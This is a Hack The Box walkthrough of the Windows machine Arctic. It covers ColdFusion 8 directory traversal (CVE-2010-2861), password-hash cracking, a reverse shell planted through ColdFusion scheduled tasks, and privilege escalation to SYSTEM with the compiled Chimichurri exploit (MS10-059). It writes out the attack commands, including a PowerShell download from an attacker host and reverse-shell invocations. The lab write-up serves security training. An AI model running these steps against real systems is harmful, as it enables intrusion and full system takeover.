
# Hack The Box — Arctic

**Platform:** Hack The Box  
**Machine:** Arctic  
**Operating System:** Windows Server 2008 R2 Standard  
**Difficulty:** Easy  
**Category:** Windows / Web Exploitation / Privilege Escalation  
**Status:** Completed

---

## Overview

Arctic is a Windows-based Hack The Box machine that involves exploiting a vulnerable Adobe ColdFusion 8 installation to obtain initial access, followed by local privilege escalation through a Windows vulnerability.

This machine required several stages of exploitation, including directory traversal, password hash recovery, administrative authentication, scheduled task abuse, reverse-shell execution, and compilation of a Windows privilege-escalation exploit.

Unlike some previous machines, this challenge involved working directly with C++ exploit source code, understanding Windows API functionality, and troubleshooting cross-compilation dependencies.

**Attack Path:**

1. Enumerate exposed services using Nmap.
2. Identify Adobe ColdFusion 8 running on JRun.
3. Exploit CVE-2010-2861 to retrieve the ColdFusion administrator password hash.
4. Recover the password using John the Ripper.
5. Authenticate to the ColdFusion Administrator interface.
6. Abuse scheduled task functionality to publish a ColdFusion reverse-shell payload.
7. Obtain an interactive shell as a low-privileged user.
8. Enumerate Windows privileges, architecture, and installed hotfixes.
9. Identify MS10-059 (CVE-2010-2554) as a potential privilege-escalation vulnerability.
10. Compile and execute Chimichurri to obtain SYSTEM access.

---

## 1. Reconnaissance and Enumeration

### Nmap Scan

I began by performing a TCP service and operating system scan against the target.

```bash
nmap -sS -sV -sC -O --reason <TARGET_IP>
```

### Results

The scan identified three exposed TCP ports:

| Port | Service | Description |
|------|---------|-------------|
| 135 | MSRPC | Microsoft Windows RPC |
| 8500 | HTTP | JRun Web Server |
| 49154 | MSRPC | Microsoft Windows RPC |

The most interesting finding was TCP port **8500**, which was running JRun Web Server.

JRun is a Java application server historically associated with Adobe ColdFusion.

The initial operating system fingerprint suggested an older Windows operating system, making further enumeration worthwhile.

<img width="1905" height="416" alt="image" src="https://github.com/user-attachments/assets/35a40223-a7f3-4da9-ba55-81a7a3f392c4" />

### Web Enumeration

Navigating to:

```text
http://<TARGET_IP>:8500/
```

revealed an Adobe ColdFusion application.

Further examination identified ColdFusion 8.

ColdFusion uses ColdFusion Markup Language (CFML) to generate dynamic web content. Its pages commonly use the `.cfm` extension.

The underlying JRun application server also provides Java-based functionality, including support for JavaServer Pages (`.jsp`).


<img width="740" height="310" alt="image" src="https://github.com/user-attachments/assets/0da23967-4fbf-4d14-8bb8-4b014d9cf37e" />


## 2. ColdFusion Directory Traversal

### Vulnerability Identification

Research into Adobe ColdFusion 8 revealed a directory traversal vulnerability:

**CVE-2010-2861 — Adobe ColdFusion Directory Traversal**

This vulnerability can allow an unauthenticated attacker to access files outside the intended web directory.

I investigated the vulnerability using a Metasploit auxiliary scanner.

```text
use auxiliary/scanner/http/coldfusion_locale_traversal
```

I configured the module:

```text
set RHOSTS <TARGET_IP>
set RPORT 8500
```

Initially, the scanner failed because file retrieval had not been configured correctly.

After reviewing the module options, I identified the need to specify a target file.

```text
set FILE ColdFusion8/lib/password.properties
set FINGERPRINT false
run
```

The module successfully retrieved the ColdFusion password configuration file.

<img width="1142" height="515" alt="image" src="https://github.com/user-attachments/assets/a698a752-106d-4dc5-bc6f-a949c9f70324" />


### Credential Discovery

The recovered configuration contained an encrypted administrator password represented by a hexadecimal hash.

```text
password=<REDACTED_HASH>
encrypted=true
```

The value was consistent with a 40-character SHA-1 hash.

This demonstrated how a directory traversal vulnerability could expose sensitive authentication material without requiring administrative access.

**Security Impact:**

The vulnerability allowed sensitive configuration files to be retrieved and ultimately contributed to the compromise of the ColdFusion administrative interface.

---

## 3. Password Hash Recovery

After obtaining the administrator password hash, I used John the Ripper to attempt offline password recovery.

First, I saved the hash to a file.

```bash
echo '<REDACTED_HASH>' > hash.txt
```

Then I used the RockYou wordlist:

```bash
john --format=Raw-SHA1 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  hash.txt
```

John successfully recovered the administrator password.

To display the recovered result:

```bash
john --show --format=Raw-SHA1 hash.txt
```

**Recovered Password:** `[REDACTED]`

<img width="868" height="337" alt="image" src="https://github.com/user-attachments/assets/53236570-ed96-4fd9-8863-801afde98579" />


### Administrative Authentication

Using the recovered credential, I accessed the ColdFusion Administrator interface:

```text
http://<TARGET_IP>:8500/CFIDE/administrator/
```

Authentication was successful.

This provided access to ColdFusion's administrative functionality, including scheduled task configuration.


<img width="1007" height="667" alt="image" src="https://github.com/user-attachments/assets/a48918aa-eb25-473b-890a-319b53b98d9d" />


## 4. Initial Access — ColdFusion Scheduled Tasks

### Identifying an Execution Opportunity

While reviewing the ColdFusion Administrator interface, I discovered the Scheduled Tasks functionality under:

**Debugging & Logging → Scheduled Tasks**

The feature allows administrators to retrieve content from specified URLs and optionally publish the retrieved output to a file.

This created a potential opportunity to place a server-executable file within a web-accessible directory.

Before attempting code execution, I validated the underlying functionality.

### Testing HTTP Connectivity

On Kali, I created a harmless test file:

```bash
echo "Hello from Kali" > test.txt
```

I then started a Python HTTP server:

```bash
python3 -m http.server 8000
```

Within ColdFusion Scheduled Tasks, I configured a task to retrieve:

```text
http://<ATTACKER_IP>:8000/test.txt
```

The task successfully connected to the Kali HTTP server.

The server logged an HTTP GET request returning status code `200`.


<img width="777" height="193" alt="image" src="https://github.com/user-attachments/assets/5c404ec9-2abd-40b4-9b99-2d964e1530ba" />


### Verifying File Publishing

Next, I enabled the scheduled task's publishing functionality.

I configured the task to save the retrieved content to a test file within the ColdFusion web directory.

After running the scheduled task, I navigated to the published file through the browser.

The expected test message appeared.

This confirmed that ColdFusion could:

1. Retrieve content from an external HTTP server.
2. Save the response to its local filesystem.
3. Make the published file accessible through the web server.

The distinction was important because an HTTP 200 response alone did not establish that the file had been saved successfully.


### Establishing a Reverse Shell

After validating file publishing, I prepared a ColdFusion-compatible `.cfm` payload.

The payload used CFML functionality to invoke Windows command execution and initiate a reverse TCP connection.

I hosted the payload using the existing Python HTTP server.

A separate Netcat listener was started on Kali:

```bash
nc -lvnp 4444
```

Using ColdFusion Scheduled Tasks, I retrieved the `.cfm` payload and published it to the ColdFusion web directory.

Navigating to the published file triggered server-side execution.

```text
http://<TARGET_IP>:8500/<PAYLOAD>.cfm
```

The target successfully initiated a reverse TCP connection to Kali.


<img width="673" height="677" alt="image" src="https://github.com/user-attachments/assets/0b48feea-a120-4e03-819b-3aa027d54b36" />


### Verifying Initial Access

Within the reverse shell, I executed:

```powershell
whoami
```

This identified the account running the ColdFusion process.

Additional enumeration confirmed that I had obtained an interactive PowerShell session on the target.

I also encountered a ColdFusion timeout error in the browser.

This occurred because the server-side execution process remained active while the reverse shell was connected.

Despite the browser error, the reverse shell continued functioning.

**Lesson:** An application error does not necessarily indicate that exploitation failed. The results must be validated independently.

---

## 5. User Flag

After obtaining initial access, I navigated to the compromised user's Desktop directory.

```powershell
cd C:\Users\<USERNAME>\Desktop
dir
```

I located the user flag:

```powershell
type user.txt
```

**User Flag:** `[REDACTED]`


<img width="515" height="252" alt="image" src="https://github.com/user-attachments/assets/45f72c0f-b778-4cf1-9ca8-49f31d636827" />


---

## 6. Local Privilege Enumeration

With initial access established, I began investigating potential privilege-escalation paths.

### Operating System Information

I executed:

```powershell
systeminfo
```

The output identified:

```text
OS Name: Microsoft Windows Server 2008 R2 Standard
OS Version: 6.1.7600
System Type: x64-based PC
```

The system also reported no installed hotfixes.

I attempted to verify installed updates using:

```powershell
Get-HotFix
```

And:

```cmd
systeminfo | findstr /i "KB"
```

No hotfixes were reported.

This suggested that the machine could be vulnerable to older Windows local privilege-escalation vulnerabilities.


<img width="508" height="65" alt="image" src="https://github.com/user-attachments/assets/7942083d-7424-4275-9362-5888995cf272" />


### User Privileges

I examined the current account's privileges.

```powershell
whoami /priv
```

One particularly interesting result was:

```text
SeImpersonatePrivilege    Enabled
```

This privilege allows a process to impersonate a client after authentication.

Although it is not sufficient by itself to obtain SYSTEM access, it can be useful in certain Windows privilege-escalation techniques.

I also examined group memberships:

```powershell
whoami /groups
```

The process had a High integrity level and a service-related security context.

However, the current account was not a member of the local Administrators group.

To verify local administrative membership, I used:

```powershell
net localgroup administrators
```

The results confirmed that further privilege escalation was necessary.



### Architecture Verification

I verified the process architecture using:

```powershell
[Environment]::GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")
```

The result was:

```text
AMD64
```

This confirmed that the process was operating in a 64-bit environment.

Architecture was an important consideration because some historical Windows exploits were originally developed as 32-bit applications.

---

## 7. Privilege Escalation — MS10-059

### Vulnerability Research

I investigated local privilege-escalation vulnerabilities affecting Windows Server 2008 R2.

A promising candidate was:

**MS10-059 — CVE-2010-2554**

This vulnerability involves insecure permissions associated with Windows service tracing functionality.

A successful exploit can allow a lower-privileged user to execute code with elevated privileges.

The target's operating system version and lack of reported hotfixes made the vulnerability worth investigating.

### Exploit Discovery

I searched for a public exploit using SearchSploit:

```bash
searchsploit MS10-059
```

Initially, I was unable to locate a result.

After updating and investigating the local Exploit-DB database, I searched using the Exploit-DB identifier.

```bash
searchsploit 14610
```

This returned:

```text
Microsoft Windows - Tracing Registry Key ACL Privilege Escalation
windows/local/14610.txt
```

I examined the entry:

```bash
searchsploit -x 14610
```

The entry referenced a proof-of-concept exploit known as **Chimichurri**.

**Reference:**

https://www.exploit-db.com/exploits/14610


<img width="1137" height="195" alt="image" src="https://github.com/user-attachments/assets/7c549a13-a911-4802-b9f1-7ffca28f0e8f" />


## 8. Chimichurri Source Code Analysis

### Downloading the Exploit

I retrieved the source archive referenced by Exploit-DB.

The archive contained:

```text
Chimichurri.cpp
Chimichurri.vcproj
stdafx.cpp
stdafx.h
ReadMe.txt
```

The archive did not contain a ready-to-run Windows executable.

This meant the exploit needed to be compiled before it could be tested.

### Reviewing the Documentation

I used the README directly from the archive:

```bash
unzip -p 14610.zip Chimichurri/ReadMe.txt
```

The documentation was a Visual C++ project template.

To help grow, I tried to inspect the actual source code and project configuration to understand the exploit's dependencies and execution behavior.

### Identifying the Build Architecture

I inspected the Visual Studio project:

```bash
grep -iE 'Win32|x64|Machine' \
  Chimichurri/Chimichurri.vcproj
```

The output included:

```text
Name="Release|Win32"
TargetMachine="1"
```

This established that the project was originally configured for 32-bit Windows.

Although Arctic was running a 64-bit operating system, Windows Server 2008 R2 can normally execute compatible 32-bit applications through WOW64.

However, I still needed to verify that the exploit implementation was compatible with the target.

### Understanding the Exploit Logic

I inspected the source code:

```bash
less Chimichurri/Chimichurri.cpp
```

I also searched for relevant Windows API functions:

```bash
grep -nE 'main\(|argc|argv|CreateProcess|WinExec|system\(' \
  Chimichurri/Chimichurri.cpp
```

Several functions were particularly interesting.

**RegOpenKeyEx / RegSetValueEx**

These functions were used to interact with Windows registry settings related to service tracing.

**DuplicateTokenEx**

This function attempts to duplicate an existing Windows access token.

**CreateProcessAsUser**

This function attempts to launch a new process using a specified security token.

**Winsock API**

The exploit also used Windows networking functions to establish a TCP connection and redirect a command interpreter's input and output through the socket.

Source inspection established that the program expected an IP address and port as command-line arguments.


<img width="1048" height="507" alt="image" src="https://github.com/user-attachments/assets/336f646c-b515-420c-9d8c-7e1c0e879a9a" />


---

## 9. Compiling Chimichurri

### Cross-Compilation

Because Chimichurri was written in C++, I used the MinGW Windows cross-compiler on Kali.

I verified that the compiler was available:

```bash
which i686-w64-mingw32-g++
```

Then I compiled the source:

```bash
i686-w64-mingw32-g++ \
  Chimichurri/Chimichurri.cpp \
  Chimichurri/stdafx.cpp \
  -o Chimichurri.exe \
  -lws2_32
```

The `-lws2_32` argument linked the Windows Winsock library required for networking.

Compilation completed with warnings related to older C++ coding conventions.

### Verifying the Executable

I checked the resulting file:

```bash
file Chimichurri.exe
```

The output confirmed:

```text
PE32 executable (console), Intel i386
```

This established that the executable had been compiled as a 32-bit Windows application.

### Troubleshooting a Runtime Dependency

I inspected the executable's imported libraries:

```bash
i686-w64-mingw32-objdump -p Chimichurri.exe | grep "DLL Name"
```

The results included a dependency on:

```text
libgcc_s_dw2-1.dll
```

This library is associated with the MinGW runtime and might not exist on the target system.

To reduce the dependency requirements, I rebuilt the executable using static GCC runtime linking:

```bash
i686-w64-mingw32-g++ \
  Chimichurri/Chimichurri.cpp \
  Chimichurri/stdafx.cpp \
  -o Chimichurri-static.exe \
  -static-libgcc \
  -lws2_32
```

I inspected the imported DLLs again and confirmed that the additional GCC runtime dependency had been removed.

This was an important troubleshooting step because a successfully compiled executable may still fail on a target if required libraries are unavailable.


<img width="680" height="145" alt="image" src="https://github.com/user-attachments/assets/e950e00b-374b-43b4-a4a1-f5e956707127" />


## 10. Executing the Privilege-Escalation Exploit

### Preparing the Target

Before transferring the compiled executable, I verified that the compromised user could write to a temporary directory.

```powershell
cd C:\Windows\Temp
echo test > arctic-test.txt
type arctic-test.txt
```

The test succeeded.

This established a suitable staging location for the executable.

### Transferring Chimichurri

I hosted the compiled executable using the Python HTTP server on Kali.

```bash
python3 -m http.server 8000
```

Using the existing PowerShell reverse shell, I downloaded the executable to the target:

```powershell
(New-Object System.Net.WebClient).DownloadFile(
  'http://<ATTACKER_IP>:8000/Chimichurri-static.exe',
  'C:\Windows\Temp\Chimichurri.exe'
)
```

I verified that the file existed:

```powershell
dir C:\Windows\Temp\Chimichurri.exe
```

The Kali HTTP server showed a successful GET request.

I also verified the executable's integrity by comparing its SHA-256 hash between Kali and the target.

### Preparing a Separate Listener

I opened a second Netcat listener on Kali.

```bash
nc -lvnp 5555
```

I intentionally used a different port from the existing reverse shell to preserve the original access.

### Executing Chimichurri

From the compromised Windows shell, I executed:

```powershell
cd C:\Windows\Temp
.\Chimichurri.exe <ATTACKER_IP> 5555
```

The exploit successfully established a second reverse connection.

This connection provided a Windows command interpreter.

### Verifying SYSTEM Access

In the new shell, I executed:

```cmd
whoami
```

The result was:

```text
nt authority\system
```

This confirmed successful local privilege escalation.

<img width="555" height="230" alt="image" src="https://github.com/user-attachments/assets/144fccf9-601c-4df0-8418-55d365b028c2" />


## 11. Administrator Flag

After confirming SYSTEM access, I navigated to the Administrator Desktop.

```cmd
cd C:\Users\Administrator\Desktop
dir
```

I located and read the administrator flag.

```cmd
type root.txt
```

**Root Flag:** `[REDACTED]`


<img width="467" height="195" alt="image" src="https://github.com/user-attachments/assets/d4f42efd-ac6d-44de-b837-18f734a57d6a" />


## 12. Lessons Learned

### 1. Enumeration Determines the Attack Path

Identifying JRun on port 8500 was the helpful indicator to discovering Adobe ColdFusion.

Rather than focusing only on common web ports, I needed to investigate the services actually exposed by the target.

The initial Nmap findings ultimately guided the entire exploitation process.

### 2. Vulnerabilities Can Be Chained Together

The directory traversal vulnerability did not directly provide a shell.

Instead, it exposed an administrator password hash.

Recovering the password allowed access to the ColdFusion Administrator interface, which introduced additional functionality that could be abused.


### 3. Validate Each Stage Before Proceeding

One of the most useful parts of this machine was testing ColdFusion Scheduled Tasks before attempting a reverse shell.

I first verified outbound HTTP connectivity.

Next, I confirmed that the scheduled task could write retrieved content into the web directory.

Only after validating those behaviors did I attempt server-side execution.

This method helped separate connectivity, file-writing, and execution problems.

### 4. Understand Exploit Source Code

Chimichurri was not immediately available as a compiled executable.

I needed to inspect the C++ source code to understand:

- How it accepted command-line arguments.
- Which Windows APIs it used.
- How it interacted with Windows security tokens.
- How it created a reverse shell.
- Which libraries were necessary for compilation.

I must admit I used significant guidance during this phase, examining the source provided a better understanding of what the exploit was attempting to accomplish.

### 5. Compilation Success Does Not Guarantee Compatibility

The initial Chimichurri compilation completed successfully but introduced a dependency on a MinGW runtime DLL.

Inspecting the executable's imported libraries helped identify this potential issue before execution.

Recompiling with static GCC runtime linking removed that dependency.

This reinforced the importance of verifying both binary architecture and runtime dependencies.

### 7. Documentation and Research Are Important

I initially struggled to locate MS10-059 through SearchSploit.

Using the Exploit-DB identifier and inspecting the local database ultimately led me to the Chimichurri source archive.

This reinforced the value of searching vulnerabilities through multiple identifiers, including CVE numbers, bulletin numbers, exploit names, and database IDs.







**Disclaimer:** This walkthrough documents exploitation performed in an authorized Hack The Box lab environment. All techniques were used for educational and cybersecurity training purposes. Credentials, flags, and identifying lab-specific values have been redacted to avoid spoilers.
